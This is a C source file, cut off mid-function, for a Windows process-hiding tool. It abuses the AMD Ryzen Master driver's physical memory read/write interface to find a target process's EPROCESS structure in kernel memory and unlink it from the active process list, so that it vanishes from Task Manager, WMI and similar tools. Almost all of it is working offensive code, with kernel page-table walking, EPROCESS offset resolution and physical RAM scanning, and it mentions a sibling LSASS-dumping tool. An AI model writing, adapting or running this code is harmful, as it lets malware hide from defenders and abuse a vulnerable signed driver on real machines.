/*
 * dkom_hide.c — DKOM Process Hiding via AMD Ryzen Master physical R/W
 *
 * Unlinks target EPROCESS from ActiveProcessLinks → invisible to:
 *   Task Manager, Process Explorer, tasklist, Get-Process,
 *   NtQuerySystemInformation, WMI Win32_Process, EnumProcesses
 *
 * Compile:
 *   x86_64-w64-mingw32-gcc -O2 -o dkom_hide.exe dkom_hide.c
 *
 * Usage:
 *   dkom_hide.exe              → hide self
 *   dkom_hide.exe 1234         → hide by PID
 *   dkom_hide.exe notepad.exe  → hide by name (first match)
 *
 * Requires: AMD Ryzen Master driver (AMDRyzenMasterDriver0) loaded.
 *           Admin rights.
 *
 * Method priority (fastest → most robust fallback):
 *   A: HandleInfo syscall  — gets EPROCESS VA directly, ~0ms
 *   B: PsInitialSystemProcess list walk — ~5ms
 *   C: Physical RAM scan (stride-1, 256KB chunks, page fallback) — ~20-60s
 */

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <inttypes.h>

typedef LONG NTSTATUS;
typedef NTSTATUS (WINAPI *NtQSI_t)(ULONG, PVOID, ULONG, PULONG);

/* ── AMD Ryzen Master IOCTLs ──────────────────────────────────────────── */
#define AMD_IOCTL_PHYS_READ   0x81112F08
#define AMD_IOCTL_PHYS_WRITE  0x81112F0C
#define AMD_DEVICE_NAME       "\\\\.\\AMDRyzenMasterDriverV20"

typedef struct { uint64_t pa; uint32_t len; uint32_t pad; } AMD_RW_REQ;

static HANDLE g_drv = INVALID_HANDLE_VALUE;

static int drv_open(void) {
    g_drv = CreateFileA(AMD_DEVICE_NAME, GENERIC_READ|GENERIC_WRITE,
                        FILE_SHARE_READ|FILE_SHARE_WRITE,
                        NULL, OPEN_EXISTING, 0, NULL);
    return g_drv != INVALID_HANDLE_VALUE;
}

static int pa_in_range(uint64_t pa, uint32_t sz);

/* phys_read: input = [pa:8][len:4], output = [pa:8][len:4][data:len] */
#define IO_BUFSZ (4096 + 12)
static uint8_t g_io_buf[IO_BUFSZ];

static int phys_read(uint64_t pa, void *buf, uint32_t len) {
    uint8_t in[12]; *(uint64_t*)in = pa; *(uint32_t*)(in+8) = len;
    uint32_t osz = 12 + len;
    uint8_t *out; void *dyn = NULL;
    if (osz <= IO_BUFSZ) out = g_io_buf;
    else { dyn = malloc(osz); if (!dyn) return 0; out = (uint8_t*)dyn; }
    DWORD got = 0;
    BOOL ok = DeviceIoControl(g_drv, AMD_IOCTL_PHYS_READ, in, 12, out, osz, &got, NULL);
    if (ok && got >= 12) memcpy(buf, out+12, len);
    free(dyn);
    return ok && got >= 12;
}

static int phys_write(uint64_t pa, const void *data, uint32_t len) {
    if (!pa_in_range(pa, len)) return 0;
    uint32_t isz = 12 + len;
    uint8_t *in = (uint8_t*)malloc(isz); if (!in) return 0;
    *(uint64_t*)in = pa; *(uint32_t*)(in+8) = len;
    memcpy(in+12, data, len);
    DWORD got = 0;
    BOOL ok = DeviceIoControl(g_drv, AMD_IOCTL_PHYS_WRITE, in, isz, NULL, 0, &got, NULL);
    free(in);
    return ok;
}

/* ── Physical memory ranges (from Registry — same as lsass_dump) ─────── */
#define MAX_RANGES 64
typedef struct { uint64_t base; uint64_t size; } PhysRange;
static PhysRange g_ranges[MAX_RANGES];
static int       g_nranges = 0;

static void load_phys_ranges(void) {
    HKEY h;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
        "HARDWARE\\RESOURCEMAP\\System Resources\\Physical Memory",
        0, KEY_READ, &h) != ERROR_SUCCESS) goto fallback;

    char vname[256]; DWORD vn, vd, type; uint8_t *buf = NULL; DWORD sz = 0;
    for (DWORD i = 0;;i++) {
        vn = sizeof vname; vd = 0;
        if (RegEnumValueA(h,i,vname,&vn,NULL,&type,NULL,&vd) == ERROR_NO_MORE_ITEMS) break;
        if ((type!=3 && type!=8) || vd<20) continue;
        buf = (uint8_t*)malloc(vd);
        if (!buf) continue;
        if (RegQueryValueExA(h,vname,NULL,NULL,buf,&vd) == ERROR_SUCCESS) { sz=vd; break; }
        free(buf); buf = NULL;
    }
    RegCloseKey(h);

    if (buf && sz >= 20) {
        DWORD cnt = *(DWORD*)(buf+16); uint8_t *p = buf+20;
        for (DWORD i = 0; i<cnt && g_nranges<MAX_RANGES; i++, p+=20) {
            if (p+20 > buf+sz || p[0]!=3) continue;
            g_ranges[g_nranges].base = *(uint64_t*)(p+4);
            g_ranges[g_nranges].size = *(uint64_t*)(p+12);
            g_nranges++;
        }
        free(buf);
    }

    if (g_nranges > 0) {
        printf("  [+] Physical ranges: %d\n", g_nranges);
        return;
    }

fallback:
    {
        MEMORYSTATUSEX ms = {sizeof ms};
        GlobalMemoryStatusEx(&ms);
        uint64_t total = ms.ullTotalPhys;
        uint64_t end   = (total + 0x3FFFFFFF) & ~(uint64_t)0x3FFFFFFF;
        g_ranges[0].base = 0x1000;  g_ranges[0].size = 0x9E000;
        g_ranges[1].base = 0x100000; g_ranges[1].size = end - 0x100000;
        g_nranges = 2;
        printf("  [!] Registry ranges failed — using fallback (%"PRIu64" MB)\n",
               total >> 20);
    }
}

static int pa_in_range(uint64_t pa, uint32_t sz) {
    for (int i = 0; i < g_nranges; i++)
        if (pa >= g_ranges[i].base && pa+sz <= g_ranges[i].base+g_ranges[i].size) return 1;
    return 0;
}

/* ── CR3 / VA→PA helpers ─────────────────────────────────────────────── */
static uint64_t g_kernel_cr3 = 0;

/* Read 8 bytes at PA */
static uint64_t rd8(uint64_t pa) {
    uint64_t v = 0;
    phys_read(pa, &v, 8);
    return v;
}

static uint64_t kva_to_pa_cr3(uint64_t va, uint64_t cr3) {
    /* 4-level page table walk */
    uint64_t pml4e_pa = (cr3 & ~0xFFFULL) + ((va >> 39 & 0x1FF) << 3);
    uint64_t pml4e    = rd8(pml4e_pa);
    if (!(pml4e & 1)) return 0;

    uint64_t pdpte_pa = (pml4e & 0x000FFFFFFFFFF000ULL) + ((va >> 30 & 0x1FF) << 3);
    uint64_t pdpte    = rd8(pdpte_pa);
    if (!(pdpte & 1)) return 0;
    if (pdpte & (1ULL << 7)) { /* 1GB page */
        return (pdpte & 0x000FFFFFC0000000ULL) | (va & 0x3FFFFFFF);
    }

    uint64_t pde_pa = (pdpte & 0x000FFFFFFFFFF000ULL) + ((va >> 21 & 0x1FF) << 3);
    uint64_t pde    = rd8(pde_pa);
    if (!(pde & 1)) return 0;
    if (pde & (1ULL << 7)) { /* 2MB page */
        return (pde & 0x000FFFFFFFE00000ULL) | (va & 0x1FFFFF);
    }

    uint64_t pte_pa = (pde & 0x000FFFFFFFFFF000ULL) + ((va >> 12 & 0x1FF) << 3);
    uint64_t pte    = rd8(pte_pa);
    if (!(pte & 1)) return 0;
    return (pte & 0x000FFFFFFFFFF000ULL) | (va & 0xFFF);
}

/* Find kernel CR3 — 3-pass, same logic as lsass_dump.c
 *
 * KPTI: Win10 1803+ has two PML4 tables (UserCR3 shadow + full KernelCR3).
 * UserCR3 may have self-ref at 0x1ED but lacks ntoskrnl mapping → we skip it.
 * Win10 1703+ may use a randomised self-ref slot (0x100-0x1FF).
 *
 * ntoskrnl_va: used to validate — kernel CR3 must map ntoskrnl's PML4 entry.
 * Pass 0 to skip validation (accept first candidate). */
static uint64_t find_kernel_cr3_impl(uint64_t ntoskrnl_va) {
    uint32_t nt_pml4i = ntoskrnl_va ? (uint32_t)((ntoskrnl_va >> 39) & 0x1FF) : 0;
    static uint8_t pg[4096];

    /* Pass 1: classic self-ref at slot 0x1ED, scan first 256MB */
    for (int ri = 0; ri < g_nranges; ri++) {
        if (g_ranges[ri].base >= 0x10000000ULL) continue;
        uint64_t re = g_ranges[ri].base + g_ranges[ri].size;
        if (re > 0x10000000ULL) re = 0x10000000ULL;
        for (uint64_t pa = g_ranges[ri].base; pa < re; pa += 0x1000) {
            uint64_t e = 0;
            if (!phys_read(pa + 0x1ED*8, &e, 8)) continue;
            if (!((e & 1) && (e & 0x000FFFFFFFFFF000ULL) == pa)) continue;
            if (nt_pml4i) {
                uint64_t ke = 0;
                if (!phys_read(pa + nt_pml4i*8, &ke, 8) || !(ke & 1)) continue;
            }
            return pa;
        }
    }

    /* Pass 2: randomised self-ref slot (Win10 1703+ / Win11 22H2+), first 64MB */
    for (int ri = 0; ri < g_nranges; ri++) {
        if (g_ranges[ri].base >= 0x4000000ULL) continue;
        uint64_t re = g_ranges[ri].base + g_ranges[ri].size;
        if (re > 0x4000000ULL) re = 0x4000000ULL;
        for (uint64_t pa = g_ranges[ri].base; pa < re; pa += 0x1000) {
            if (!phys_read(pa, pg, 4096)) continue;
            for (int idx = 0x100; idx < 0x200; idx++) {
                uint64_t e = *(uint64_t*)(pg + idx*8);
                if (!(e & 1)) continue;
                if ((e & 0x000FFFFFFFFFF000ULL) != pa) continue;
                if (nt_pml4i) {
                    uint64_t ke = *(uint64_t*)(pg + nt_pml4i*8);
                    if (!(ke & 1)) continue;
                }
                return pa;
            }
        }
    }

    /* Pass 3: no validation fallback */
    if (ntoskrnl_va) return find_kernel_cr3_impl(0);
    return 0;
}

static uint64_t find_kernel_cr3_with_ntos(void) {
    /* Get ntoskrnl VA for validation */
    typedef NTSTATUS (NTAPI *PFN_NTQSI)(ULONG,PVOID,ULONG,PULONG);
    PFN_NTQSI fn = (PFN_NTQSI)GetProcAddress(
        GetModuleHandleA("ntdll.dll"), "NtQuerySystemInformation");
    uint64_t nt_va = 0;
    if (fn) {
        typedef struct {
            HANDLE Section; PVOID MappedBase, ImageBase;
            ULONG  ImageSize, Flags;
            USHORT LoadOrderIndex, InitOrderIndex, LoadCount, OffsetToFileName;
            CHAR   FullPathName[256];
        } MOD_ENTRY;
        typedef struct { ULONG NumberOfModules; MOD_ENTRY Modules[1]; } MOD_LIST;
        ULONG sz = 0x40000; MOD_LIST *ml = NULL; NTSTATUS st;
        do { free(ml); ml = (MOD_LIST*)malloc(sz*=2);
             if (!ml) break;
             st = fn(11, ml, sz, NULL);
        } while (st == (NTSTATUS)0xC0000004L);
        if (ml && st == 0) {
            for (ULONG i = 0; i < ml->NumberOfModules; i++) {
                const char *nm = ml->Modules[i].FullPathName
                               + ml->Modules[i].OffsetToFileName;
                if (_stricmp(nm,"ntoskrnl.exe")==0 || _stricmp(nm,"ntkrnlmp.exe")==0) {
                    nt_va = (uint64_t)ml->Modules[i].ImageBase;
                    break;
                }
            }
        }
        free(ml);
    }
    if (nt_va) printf("  [*] ntoskrnl VA = 0x%016"PRIX64" (used for CR3 validation)\n", nt_va);
    return find_kernel_cr3_impl(nt_va);
}

/* ── NTDLL helpers for Method A ─────────────────────────────────────── */
#define SystemHandleInformation 0x10

typedef struct {
    ULONG      ProcessId;
    UCHAR      ObjectTypeNumber;
    UCHAR      Flags;
    USHORT     Handle;
    PVOID      Object;   /* kernel EPROCESS VA */
    ACCESS_MASK GrantedAccess;
} SYSTEM_HANDLE_ENTRY;

typedef struct {
    ULONG              Count;
    SYSTEM_HANDLE_ENTRY Handles[1];
} SYSTEM_HANDLE_INFORMATION;

static NtQSI_t NtQSI = NULL;

/* ── EPROCESS offset struct (used by both static table and dynamic resolve) ── */
typedef struct {
    uint32_t UniqueProcessId;
    uint32_t ActiveProcessLinks;
    uint32_t ImageFileName;
    uint32_t Protection;
} EP_OFFSETS;

/* ── EPROCESS physical map — built during Method C scan ─────────────── */
/* Stores (eproc_pa, flink_val, blink_val) for every EPROCESS found.
 * Used for DKOM neighbor lookup without KVA→PA translation. */
#define MAX_EPROC_MAP 512
typedef struct { uint64_t pa, flink, blink; } EprocMapEntry;
static EprocMapEntry g_eproc_map[MAX_EPROC_MAP];
static int           g_eproc_map_n = 0;

static void eproc_map_add(uint64_t pa, uint64_t flink, uint64_t blink) {
    for (int i = 0; i < g_eproc_map_n; i++)
        if (g_eproc_map[i].pa == pa) { g_eproc_map[i].flink = flink; g_eproc_map[i].blink = blink; return; }
    if (g_eproc_map_n < MAX_EPROC_MAP) {
        g_eproc_map[g_eproc_map_n++] = (EprocMapEntry){pa, flink, blink};
    }
}

/* off_flink resolved at call time (g_ep defined later) */
static uint32_t map_get_off_flink(void);

/* g_hidden_pa: tracks EPROCESS PAs that have been unlinked, for map filtering.
 * Populated by dkom_unlink_v3 after each successful unlink. */
#define MAX_HIDDEN 64
static uint64_t g_hidden_pa[MAX_HIDDEN];
static int      g_n_hidden = 0;

static void hidden_add(uint64_t pa) {
    if (g_n_hidden < MAX_HIDDEN) g_hidden_pa[g_n_hidden++] = pa;
}

static int is_eproc_hidden(uint64_t pa) {
    for (int i = 0; i < g_n_hidden; i++)
        if (g_hidden_pa[i] == pa) return 1;
    return 0;
}

/* Full validation for a candidate prev.Flink PA — same rigor as RAM scan:
 *   1. EPROCESS PA must be 8-byte aligned (pool objects always are)
 *   2. Value at PA == our_links_kva (physical memory, not stale map data)
 *   3. Value at PA+8 (prev.Blink) must be a kernel VA (0xFFFF...)
 *   4. Value at PA-8 (UniqueProcessId) must be a valid PID (<0x10000, mult of 4) */
static int validate_prev_flink_pa(uint64_t eproc_pa, uint64_t pa,
                                    uint64_t our_links_kva) {
    if (eproc_pa & 7) return 0;                       /* alignment */
    if (rd8(pa) != our_links_kva) return 0;           /* current physical value */
    uint64_t blink = rd8(pa + 8);
    if ((blink >> 48) != 0xFFFF) return 0;            /* Blink must be kernel VA */
    uint64_t pid = rd8(pa - 8);
    if (!pid || pid >= 0x10000 || (pid & 3)) return 0; /* valid PID */
    return 1;
}

static int validate_next_blink_pa(uint64_t eproc_pa, uint64_t pa,
                                    uint64_t our_links_kva) {
    if (eproc_pa & 7) return 0;
    if (rd8(pa) != our_links_kva) return 0;
    uint64_t flink = rd8(pa - 8);
    if ((flink >> 48) != 0xFFFF) return 0;            /* Flink must be kernel VA */
    return 1;
}

static uint64_t map_find_prev_flink_pa(uint64_t our_links_kva) {
    uint32_t off = map_get_off_flink();
    for (int i = 0; i < g_eproc_map_n; i++) {
        if (g_eproc_map[i].flink != our_links_kva) continue;
        if (is_eproc_hidden(g_eproc_map[i].pa)) continue;
        uint64_t pa = g_eproc_map[i].pa + off;
        if (validate_prev_flink_pa(g_eproc_map[i].pa, pa, our_links_kva))
            return pa;
    }
    return 0;
}

static uint64_t map_find_next_blink_pa(uint64_t our_links_kva) {
    uint32_t off = map_get_off_flink();
    for (int i = 0; i < g_eproc_map_n; i++) {
        if (g_eproc_map[i].blink != our_links_kva) continue;
        if (is_eproc_hidden(g_eproc_map[i].pa)) continue;
        uint64_t pa = g_eproc_map[i].pa + off + 8;
        if (validate_next_blink_pa(g_eproc_map[i].pa, pa, our_links_kva))
            return pa;
    }
    return 0;
}

/* Update map after DKOM: prev's Flink and next's Blink changed in physical memory */
static void eproc_map_update_after_dkom(uint64_t prev_flink_pa, uint64_t next_blink_pa,
                                          uint64_t new_flink, uint64_t new_blink) {
    uint32_t off = map_get_off_flink();
    if (!off) return;
    uint64_t prev_pa = prev_flink_pa - off;
    uint64_t next_pa = next_blink_pa - off - 8;
    for (int i = 0; i < g_eproc_map_n; i++) {
        if (g_eproc_map[i].pa == prev_pa) g_eproc_map[i].flink = new_flink;
        if (g_eproc_map[i].pa == next_pa) g_eproc_map[i].blink = new_blink;
    }
}

/* ── Static layout table — used ONLY as bootstrap for physical scan ─── */
static const EP_OFFSETS g_scan_layouts[] = {
    { 0x440, 0x448, 0x5A8, 0x87A }, /* Win10 1903+ / Win11 */
    { 0x2E8, 0x2F0, 0x450, 0x6FA }, /* Win10 1809          */
    { 0x2E0, 0x2E8, 0x448, 0x6F2 }, /* Win10 1507–1803      */
};
static const uint32_t g_n_scan_layouts =
    (uint32_t)(sizeof g_scan_layouts / sizeof g_scan_layouts[0]);
#define N_LAYOUTS g_n_scan_layouts

/* ── EPROCESS offsets — dynamic resolution ───────────────────────────── */

/*
 * resolve_eprocess_offsets — derive all offsets from a known EPROCESS PA.
 *
 * Algorithm (no hardcoded values):
 *  1. Read first 0xA00 bytes of EPROCESS.
 *  2. Scan stride-8 for QWORD == pid AND at +8/+16 both kernel VAs (Flink/Blink).
 *     → UniqueProcessId offset, ActiveProcessLinks offset.
 *  3. Scan for process name string (ASCII, ≤15 chars, null-padded).
 *     → ImageFileName offset.
 *  4. Scan for PS_PROTECTION byte: byte 0x62 (WinTcb-Full) or 0x72/0x52 (Lsa)
 *     near expected range — optional, zero if not found.
 *
 * Returns 1 on success, 0 on failure.
 */
static int resolve_eprocess_offsets(uint64_t eproc_pa, uint32_t pid,
                                     const char *name, EP_OFFSETS *out) {
    uint8_t buf[0xA00];
    if (!phys_read(eproc_pa, buf, sizeof buf)) return 0;

    size_t namelen = strlen(name);
    if (namelen > 14) namelen = 14;

    uint32_t off_pid = 0, off_name = 0;

    /* Step 1: find UniqueProcessId by scanning for QWORD == pid
     * with both neighboring QWORDs being kernel VAs (Flink / Blink). */
    for (uint32_t i = 8; i + 24 <= sizeof buf; i += 8) {
        uint64_t v; memcpy(&v, buf + i, 8);
        if (v != (uint64_t)pid) continue;

        uint64_t flink, blink;
        memcpy(&flink, buf + i + 8,  8);
        memcpy(&blink, buf + i + 16, 8);
        if ((flink >> 48) != 0xFFFF) continue;
        if ((blink >> 48) != 0xFFFF) continue;
        /* Extra: Flink and Blink must differ (not an empty list) */
        if (flink == blink && flink == (uint64_t)(eproc_pa - i + i)) continue;

        off_pid = i;
        break;
    }

    /* Step 2: find ImageFileName by scanning for the name string. */
    for (uint32_t i = 0; i + namelen + 1 <= sizeof buf; i++) {
        if (_strnicmp((char*)(buf + i), name, namelen) != 0) continue;
        /* Must be null-terminated within 15 chars and all printable */
        int ok = 1;
        for (uint32_t j = 0; j < 15; j++) {
            uint8_t c = buf[i + j];
            if (c == 0) break;
            if (c < 0x20 || c > 0x7E) { ok = 0; break; }
        }
        if (!ok) continue;
        off_name = i;
        break;
    }

    if (!off_pid || !off_name) return 0;

    out->UniqueProcessId    = off_pid;
    out->ActiveProcessLinks = off_pid + 8;
    out->ImageFileName      = off_name;
    out->Protection         = 0; /* resolved separately if needed */

    printf("  [+] EPROCESS offsets resolved dynamically:\n");
    printf("      UniqueProcessId    = +0x%X\n", out->UniqueProcessId);
    printf("      ActiveProcessLinks = +0x%X\n", out->ActiveProcessLinks);
    printf("      ImageFileName      = +0x%X\n", out->ImageFileName);

    return 1;
}

/* Resolved offsets for the current target — set once, reused everywhere */
static EP_OFFSETS g_ep = {0};

static uint32_t map_get_off_flink(void) {
    return g_ep.ActiveProcessLinks ? g_ep.ActiveProcessLinks : 0x448;
}
static int        g_layout = -1; /* kept for scan fallback compat (-1 = use g_ep) */

/* Validate EPROCESS at PA using resolved offsets */
static int validate_eprocess_pa(uint64_t pa, uint32_t expected_pid,
                                  const char *expected_name, int layout_idx) {
    /* layout_idx == -1 means use g_ep (dynamic); otherwise use EP_LAYOUTS fallback */
    uint32_t off_pid, off_flink, off_name;
    if (layout_idx < 0) {
        if (!g_ep.UniqueProcessId) return 0;
        off_pid   = g_ep.UniqueProcessId;
        off_flink = g_ep.ActiveProcessLinks;
        off_name  = g_ep.ImageFileName;
    } else {
        if ((uint32_t)layout_idx >= g_n_scan_layouts) return 0;
        off_pid   = g_scan_layouts[layout_idx].UniqueProcessId;
        off_flink = g_scan_layouts[layout_idx].ActiveProcessLinks;
        off_name  = g_scan_layouts[layout_idx].ImageFileName;
    }

    uint8_t buf[0x600];
    uint32_t need = off_name + 16;
    if (need > sizeof buf) need = sizeof buf;
    if (!phys_read(pa, buf, need)) return 0;

    uint64_t pid_val = 0;
    memcpy(&pid_val, buf + off_pid, 8);
    if ((uint32_t)pid_val != expected_pid) return 0;

    char nm[16] = {0};
    memcpy(nm, buf + off_name, 15);
    if (_stricmp(nm, expected_name) != 0) return 0;

    uint64_t flink;
    memcpy(&flink, buf + off_flink, 8);
    if ((flink >> 48) != 0xFFFF) return 0;

    return 1;
}

/* ── Process name lookup ─────────────────────────────────────────────── */
static int pid_to_name(DWORD pid, char *out, size_t outsz) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;
    PROCESSENTRY32 pe = {sizeof pe};
    int found = 0;
    if (Process32First(snap, &pe)) {
        do {
            if (pe.th32ProcessID == pid) {
                strncpy(out, pe.szExeFile, outsz-1);
                out[outsz-1] = 0;
                found = 1;
                break;
            }
        } while (Process32Next(snap, &pe));
    }
    CloseHandle(snap);
    return found;
}

static DWORD name_to_pid(const char *name) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;
    PROCESSENTRY32 pe = {sizeof pe};
    DWORD pid = 0;
    if (Process32First(snap, &pe)) {
        do {
            if (_stricmp(pe.szExeFile, name) == 0) {
                pid = pe.th32ProcessID;
                break;
            }
        } while (Process32Next(snap, &pe));
    }
    CloseHandle(snap);
    return pid;
}

/* ── EPROCESS location methods ──────────────────────────────────────── */

/*
 * Method A: NtQuerySystemInformation(HandleInfo)
 * Opens target process, finds our handle in the system handle table,
 * reads Object pointer = EPROCESS kernel VA, then PA via page walk.
 * Speed: < 1ms. Most reliable if kernel CR3 is readable.
 */
static uint64_t eproc_via_handle(DWORD target_pid, const char *name) {
    if (!NtQSI) return 0;

    /* Open a handle to target */
    HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, target_pid);
    if (!hProc) {
        printf("    [Method A] OpenProcess failed (%lu)\n", GetLastError());
        return 0;
    }

    /* Query all system handles — grow buffer until it fits */
    ULONG buf_size = 0x100000;
    SYSTEM_HANDLE_INFORMATION *shi = NULL;
    NTSTATUS status;
    for (int tries = 0; tries < 8; tries++) {
        shi = (SYSTEM_HANDLE_INFORMATION*)malloc(buf_size);
        if (!shi) break;
        ULONG ret_len = 0;
        status = NtQSI(SystemHandleInformation, shi, buf_size, &ret_len);
        if (status == 0) break;
        free(shi); shi = NULL;
        buf_size *= 2;
    }
    if (!shi) { CloseHandle(hProc); return 0; }

    DWORD my_pid = GetCurrentProcessId();
    uint64_t eproc_kva = 0;

    for (ULONG i = 0; i < shi->Count; i++) {
        SYSTEM_HANDLE_ENTRY *he = &shi->Handles[i];
        if (he->ProcessId != my_pid) continue;
        if ((HANDLE)(uintptr_t)he->Handle != hProc) continue;
        eproc_kva = (uint64_t)(uintptr_t)he->Object;
        break;
    }
    free(shi);
    CloseHandle(hProc);

    if (!eproc_kva) {
        printf("    [Method A] Handle not found in system table\n");
        return 0;
    }
    printf("    [Method A] EPROCESS KVA = 0x%016" PRIX64 "\n", eproc_kva);

    /* Translate KVA → PA using kernel CR3 */
    if (!g_kernel_cr3) {
        printf("    [Method A] No kernel CR3 — skipping VA→PA\n");
        return 0;
    }
    uint64_t pa = kva_to_pa_cr3(eproc_kva, g_kernel_cr3);
    if (!pa) {
        printf("    [Method A] kva_to_pa failed (KVA=0x%016" PRIX64 ")\n", eproc_kva);
        return 0;
    }

    /* Quick validate */
    if (g_layout >= 0 && !validate_eprocess_pa(pa, target_pid, name, g_layout)) {
        printf("    [Method A] Validation failed at PA=0x%016" PRIX64 "\n", pa);
        return 0;
    }

    printf("    [Method A] EPROCESS PA = 0x%016" PRIX64 "\n", pa);
    return pa;
}

/*
 * Method B: Walk ActiveProcessLinks from PsInitialSystemProcess
 * Needs ntoskrnl VA + kernel CR3 to find PsInitialSystemProcess PA.
 * Speed: ~5ms once System EPROCESS is known.
 */
static uint64_t find_ntoskrnl_base(void) {
    /* Find ntoskrnl via loaded module list — NtQuerySystemInformation(SystemModuleInformation=0xB) */
    if (!NtQSI) return 0;
    uint8_t *buf = (uint8_t*)malloc(0x80000);
    if (!buf) return 0;
    ULONG ret_len = 0;
    NTSTATUS st = NtQSI(0xB, buf, 0x80000, &ret_len);
    uint64_t base = 0;
    if (st == 0) {
        ULONG count = *(ULONG*)buf;
        /* Each entry: RTL_PROCESS_MODULE_INFORMATION = 0x108 bytes
         * offset 0x10 = ImageBase (pointer), offset 0x1C = LoadOrderIndex */
        uint8_t *entry = buf + 4 + 4; /* skip count + pad */
        /* First entry is always ntoskrnl */
        memcpy(&base, entry + 0x10, 8);
    }
    free(buf);
    return base;
}

static uint64_t eproc_via_list_walk(DWORD target_pid, const char *name,
                                     uint64_t system_eproc_pa) {
    if (!system_eproc_pa || !g_ep.ActiveProcessLinks) return 0;
    const EP_OFFSETS *ep = &g_ep;

    /* Walk the circular list from System EPROCESS */
    uint64_t links_pa  = system_eproc_pa + ep->ActiveProcessLinks;
    uint64_t flink_kva = rd8(links_pa);
    if (!flink_kva || (flink_kva >> 48) != 0xFFFF) return 0;

    uint64_t start_kva = flink_kva;
    int steps = 0;
    const int MAX_STEPS = 2000;

    while (steps++ < MAX_STEPS) {
        /* Convert current LIST_ENTRY KVA to EPROCESS PA */
        uint64_t eproc_kva = flink_kva - ep->ActiveProcessLinks;
        uint64_t eproc_pa  = kva_to_pa_cr3(eproc_kva, g_kernel_cr3);
        if (!eproc_pa) {
            /* Can't translate — follow Flink from current */
            goto next;
        }

        if (validate_eprocess_pa(eproc_pa, target_pid, name, g_layout)) {
            printf("    [Method B] Found at PA=0x%016" PRIX64 " (step %d)\n",
                   eproc_pa, steps);
            return eproc_pa;
        }

    next:;
        /* Read next Flink: it's at (eproc_pa + ActiveProcessLinks) if PA works,
         * or follow KVA→next via page walk */
        if (eproc_pa) {
            flink_kva = rd8(eproc_pa + ep->ActiveProcessLinks);
        } else {
            /* Follow via PA of the list entry itself */
            uint64_t entry_pa = kva_to_pa_cr3(flink_kva, g_kernel_cr3);
            if (!entry_pa) break;
            flink_kva = rd8(entry_pa);
        }

        if (!flink_kva || (flink_kva >> 48) != 0xFFFF) break;
        if (flink_kva == start_kva) break; /* full circle */
    }
    return 0;
}

/*
 * Method C: Physical RAM scan (most robust fallback)
 *
 * Optimisations:
 *   • 256KB chunks — same size proven in lsass_dump (fewer IOCTL timeouts)
 *   • Stride-1 — most robust; no alignment assumption
 *   • First-char pre-filter — rejects 255/256 positions immediately
 *   • Sub-chunk fallback — if 256KB IOCTL fails, retry page-by-page (4KB)
 *   • Multi-layout detection — tries all known offsets
 *   • Early exit — stops at first confirmed EPROCESS
 */
static uint64_t eproc_via_phys_scan(DWORD target_pid, const char *target_name) {
    static uint8_t chunk[0x40000]; /* 256KB */
    static uint8_t page_buf[0x1000];
    const uint32_t CHUNK = sizeof chunk;
    const char fc = target_name[0]; /* first char for fast filter */
    size_t name_len = strlen(target_name);
    if (name_len > 15) name_len = 15;

    printf("    [Method C] Physical scan (pid=%lu name=%s)...\n",
           target_pid, target_name);

    uint64_t print_next    = 0;
    uint64_t target_pa_found = 0;

    for (int ri = 0; ri < g_nranges; ri++) {
        uint64_t rbase = g_ranges[ri].base;
        uint64_t rend  = g_ranges[ri].base + g_ranges[ri].size;

        for (uint64_t cpa = rbase; cpa < rend; cpa += CHUNK) {
            if (cpa >= print_next) {
                printf("\r    [Method C] [%4" PRIu64 "MB / %4" PRIu64 "MB]  ",
                       cpa >> 20, rend >> 20);
                fflush(stdout);
                print_next = cpa + (256ULL << 20); /* print every 256MB */
            }

            uint64_t csz = rend - cpa;
            if (csz > CHUNK) csz = CHUNK;

            /* Try bulk read; fallback to page-by-page if it fails */
            int have_chunk = phys_read(cpa, chunk, (uint32_t)csz);
            if (!have_chunk) {
                memset(chunk, 0, (size_t)csz);
                int any = 0;
                for (uint64_t pg = 0; pg < csz; pg += 0x1000) {
                    uint32_t psz = (csz - pg < 0x1000) ? (uint32_t)(csz - pg) : 0x1000;
                    if (phys_read(cpa + pg, page_buf, psz)) {
                        memcpy(chunk + pg, page_buf, psz);
                        any = 1;
                    }
                }
                if (!any) continue;
            }

            /* Stride-1 scan */
            for (uint64_t off = 0; off + name_len <= csz; off++) {
                /* Fast filter on first char */
                if (chunk[off] != (uint8_t)fc) continue;

                /* Full name compare */
                if (strncmp((char*)(chunk + off), target_name, name_len) != 0) continue;

                /* Try layouts. Once g_layout is confirmed, only use that one.
                 * This prevents multiple layout interpretations of same string
                 * from polluting the map and overwriting the correct EPROCESS PA. */
                for (int li = 0; li < (int)N_LAYOUTS; li++) {
                    /* Skip unconfirmed layouts once we know which one is right */
                    if (g_layout >= 0 && li != (int)g_layout) continue;

                    const EP_OFFSETS *ep = (const EP_OFFSETS*)&g_scan_layouts[li];

                    uint64_t eproc_pa, flink = 0, blink = 0;
                    uint32_t pid_val = 0;

                    if (off < ep->ImageFileName) {
                        /* Cross-boundary: EPROCESS starts before this chunk */
                        eproc_pa = cpa + off - ep->ImageFileName;
                        uint8_t pb[4];
                        if (!phys_read(eproc_pa + ep->UniqueProcessId, pb, 4)) continue;
                        memcpy(&pid_val, pb, 4);
                        uint8_t fb[8];
                        if (!phys_read(eproc_pa + ep->ActiveProcessLinks, fb, 8)) continue;
                        memcpy(&flink, fb, 8);
                        uint8_t bb[8];
                        if (phys_read(eproc_pa + ep->ActiveProcessLinks + 8, bb, 8))
                            memcpy(&blink, bb, 8);
                    } else {
                        eproc_pa = cpa + off - ep->ImageFileName;
                        uint64_t pid_off_chunk = off - ep->ImageFileName + ep->UniqueProcessId;
                        if (pid_off_chunk + 4 <= csz)
                            memcpy(&pid_val, chunk + pid_off_chunk, 4);
                        else {
                            uint8_t pb[4];
                            if (!phys_read(eproc_pa + ep->UniqueProcessId, pb, 4)) continue;
                            memcpy(&pid_val, pb, 4);
                        }
                        uint64_t fl_off = off - ep->ImageFileName + ep->ActiveProcessLinks;
                        if (fl_off + 8 <= csz)
                            memcpy(&flink, chunk + fl_off, 8);
                        else {
                            uint8_t fb[8];
                            if (!phys_read(eproc_pa + ep->ActiveProcessLinks, fb, 8)) continue;
                            memcpy(&flink, fb, 8);
